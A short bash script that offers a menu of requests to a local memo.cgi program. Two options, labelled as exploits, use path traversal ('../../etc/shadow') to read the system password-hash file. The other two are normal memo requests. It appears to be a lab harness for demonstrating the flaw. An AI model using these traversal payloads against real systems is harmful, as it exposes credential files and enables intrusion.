#!/bin/bash

while true
do
  echo ""
  echo "What request do you want to send?"
  echo ""
  echo ""

  echo "For exploiting the vulnerability."
  echo "[1] http://localhost/cgi-bin/memo.cgi?memo=/root/memo/../../etc/shadow"
  echo "[2] http://localhost/cgi-bin/memo.cgi?memo=/home/../root/memo/../../etc/shadow"

  echo ""

  echo "Correct requests."
  echo "[3] http://localhost/cgi-bin/memo.cgi?memo=/home/barbazzo/memo/please_clean_microwave"
  echo "[4] http://localhost/cgi-bin/memo.cgi?memo=/root/memo/printer_queue_problems"

  read -r query_id

  case $query_id in
    1)
      elinks -dump http://localhost/cgi-bin/memo.cgi?memo=/root/memo/../../etc/shadow
      ;;

    2)
      elinks -dump http://localhost/cgi-bin/memo.cgi?memo=/home/../root/memo/../../etc/shadow
      ;;

    3)
      elinks -dump http://localhost/cgi-bin/memo.cgi?memo=/home/barbazzo/memo/please_clean_microwave
      ;;

    4)
      elinks -dump http://localhost/cgi-bin/memo.cgi?memo=/root/memo/printer_queue_problems
      ;;

    *)
      echo "Please introduce a valid query id."
      ;;
  esac
  echo ""
done

